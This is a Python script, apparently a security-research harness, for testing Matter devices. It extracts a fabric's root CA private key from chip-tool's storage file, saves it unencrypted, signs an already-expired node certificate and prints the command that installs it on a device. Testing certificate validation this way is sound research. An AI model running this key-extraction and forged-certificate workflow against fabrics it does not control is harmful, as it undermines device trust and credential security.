"""
RQ1 pipeline: extracts the real CA of the active fabric, signs an
expired NOC, and converts it to TLV ready for update-noc. 
"""
import sys, subprocess, base64, re, os
from cryptography import x509
from cryptography.x509.oid import ObjectIdentifier, ExtendedKeyUsageOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from datetime import datetime, timezone

CHIP_TOOL = os.path.expanduser("~/connectedhomeip/out/host/chip-tool")
CHIP_CERT = os.path.expanduser("~/connectedhomeip/out/host/chip-cert")
CHIP_TOOL_STORAGE = "/tmp/chip_tool_config.alpha.ini"


def run(cmd, label):
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        print(f"!!! FAILED at '{label}' (exit {r.returncode})")
        print("STDOUT:", r.stdout[-2000:])
        print("STDERR:", r.stderr[-2000:])
        sys.exit(1)
    return r.stdout


def step1_read_rcac():
    print("[1] Reading the real fabric RCAC...")
    out = run([CHIP_TOOL, "operationalcredentials", "read",
               "trusted-root-certificates", "1", "0"], "read RCAC")
    m = re.search(r'\[1\]:\s*([0-9A-Fa-f]+)', out)
    if not m:
        print("!!! RCAC not found in chip-tool output"); sys.exit(1)
    rcac_hex = m.group(1).strip()
    for f in ["fabric_trusted_root.hex", "fabric_trusted_root.pem"]:
        if os.path.exists(f): os.remove(f)
    with open("fabric_trusted_root.hex", "w") as f:
        f.write(rcac_hex)
    run([CHIP_CERT, "convert-cert", "-p", "fabric_trusted_root.hex",
         "fabric_trusted_root.pem"], "convert-cert RCAC -> X.509 PEM")
    with open("fabric_trusted_root.pem", "rb") as f:
        ca_cert = x509.load_pem_x509_certificate(f.read())
    pub = ca_cert.public_key().public_bytes(
        encoding=serialization.Encoding.X962,
        format=serialization.PublicFormat.UncompressedPoint)
    print(f"    RCAC OK. Subject: {ca_cert.subject}")
    print(f"    RCAC pubkey: {pub.hex()}")
    return ca_cert, pub


def step2_extract_ca_key(expected_pub):
    print("[2] Extracting the real chip-tool private key...")
    if not os.path.exists(CHIP_TOOL_STORAGE):
        print(f"!!! {CHIP_TOOL_STORAGE} does not exist"); sys.exit(1)
    with open(CHIP_TOOL_STORAGE) as f:
        content = f.read()
    m = re.search(r'ExampleOpCredsCAKey\d*=([A-Za-z0-9+/=]+)', content)
    if not m:
        print("!!! ExampleOpCredsCAKey not found in storage"); sys.exit(1)
    raw = base64.b64decode(m.group(1))
    if len(raw) != 97:
        print(f"!!! Unexpected key length: {len(raw)} bytes"); sys.exit(1)
    priv_int = int.from_bytes(raw[65:97], "big")
    priv_key = ec.derive_private_key(priv_int, ec.SECP256R1())
    derived_pub = priv_key.public_key().public_bytes(
        encoding=serialization.Encoding.X962,
        format=serialization.PublicFormat.UncompressedPoint)
    if derived_pub != expected_pub:
        print("!!! MISMATCH: the private key does NOT correspond to the real RCAC.")
        print(f"    Derived: {derived_pub.hex()}")
        print(f"    Expected: {expected_pub.hex()}")
        print("    Aborting -- will not sign with this key.")
        sys.exit(1)
    print("    Private key verified: matches the real RCAC exactly.")
    if os.path.exists("real_root_key.pem"): os.remove("real_root_key.pem")
    with open("real_root_key.pem", "wb") as f:
        f.write(priv_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()))
    return priv_key


def step3_extract_csr(nocsr_hex):
    print("[3] Extracting CSR from NOCSRElements (dynamic offset)...")
    prefix = "153001"
    idx = nocsr_hex.find(prefix)
    if idx == -1:
        print("!!! TLV prefix 153001 not found"); sys.exit(1)
    length_pos = idx + len(prefix)
    length = int(nocsr_hex[length_pos:length_pos+2], 16)
    start = length_pos + 2
    csr_hex = nocsr_hex[start:start + length*2]
    csr = x509.load_der_x509_csr(bytes.fromhex(csr_hex))
    print(f"    CSR valid. Subject: {csr.subject}")
    return csr


def step4_sign_expired_noc(csr, ca_cert, ca_key, node_id, fabric_id):
    print("[4] Signing expired NOC...")
    OID_NODE_ID = ObjectIdentifier("1.3.6.1.4.1.37244.1.1")
    OID_FABRIC_ID = ObjectIdentifier("1.3.6.1.4.1.37244.1.5")
    subject = x509.Name([
        x509.NameAttribute(OID_NODE_ID, node_id),
        x509.NameAttribute(OID_FABRIC_ID, fabric_id),
    ])
    not_before = datetime(2020, 1, 1, 0, 0, 0, tzinfo=timezone.utc)
    not_after  = datetime(2020, 12, 30, 23, 59, 59, tzinfo=timezone.utc)
    builder = (
        x509.CertificateBuilder()
        .subject_name(subject).issuer_name(ca_cert.subject)
        .public_key(csr.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(not_before).not_valid_after(not_after)
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(x509.KeyUsage(digital_signature=True, content_commitment=False,
            key_encipherment=False, data_encipherment=False, key_agreement=False,
            key_cert_sign=False, crl_sign=False, encipher_only=False, decipher_only=False),
            critical=True)
        .add_extension(x509.ExtendedKeyUsage(
            [ExtendedKeyUsageOID.SERVER_AUTH, ExtendedKeyUsageOID.CLIENT_AUTH]), critical=True)
        .add_extension(x509.SubjectKeyIdentifier.from_public_key(csr.public_key()), critical=False)
        .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_cert.public_key()), critical=False)
    )
    cert = builder.sign(ca_key, hashes.SHA256())
    for f in ["expired_noc_signed.pem", "expired_noc_signed.hex"]:
        if os.path.exists(f): os.remove(f)
    with open("expired_noc_signed.pem", "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))
    run([CHIP_CERT, "convert-cert", "-x", "expired_noc_signed.pem",
         "expired_noc_signed.hex"], "convert-cert NOC -> TLV hex")
    with open("expired_noc_signed.hex") as f:
        noc_hex = f.read().strip()
    print(f"    NOC signed and converted to TLV. {len(noc_hex)} hex chars.")
    return noc_hex


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 run_rq1_attack.py <NOCSRElements_hex> [node_id] [fabric_id]")
        sys.exit(1)
    nocsr_hex = sys.argv[1]
    node_id = sys.argv[2] if len(sys.argv) > 2 else "1122334455667788"
    fabric_id = sys.argv[3] if len(sys.argv) > 3 else "0000000000000001"
    ca_cert, expected_pub = step1_read_rcac()
    ca_key = step2_extract_ca_key(expected_pub)
    csr = step3_extract_csr(nocsr_hex)
    noc_hex = step4_sign_expired_noc(csr, ca_cert, ca_key, node_id, fabric_id)
    print("\n=== DONE ===")
    print("Now run:")
    print(f'{CHIP_TOOL} operationalcredentials update-noc hex:$(cat expired_noc_signed.hex) 1 0')
